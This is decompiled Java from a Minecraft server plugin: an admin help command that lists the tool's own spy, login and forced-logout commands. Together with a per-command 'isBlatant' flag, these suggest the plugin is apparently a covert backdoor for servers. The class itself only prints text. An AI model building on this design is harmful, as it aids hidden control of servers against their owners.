/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.help;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.Tips;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class AdminhelpCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        int maxPages = 1;
        if (plugin.admin.contains(p2.getName())) {
            if (args.length <= 1) {
                p2.sendMessage(Settings.USAGE("adminhelp <1-" + maxPages + ">"));
            } else if (args[1].equalsIgnoreCase("1")) {
                p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
                p2.sendMessage("  " + Settings.DARK_RED + Settings.NAME + " by " + Settings.AUTHOR);
                p2.sendMessage("");
                p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&7spy &8l &fSpys on everyones " + Settings.NAME + " commands")));
                p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7login &8l &fLogins another user"));
                p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7forcelogout &8l &fLogouts another user"));
                p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7logoutall &8l &fLogs out all other users logged in"));
                p2.sendMessage("");
                p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&8(" + Settings.DARK_RED + "Tip&8) l &7" + Tips.getTip())));
                p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be an " + Settings.RED + "admin " + Settings.WHITE + " to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

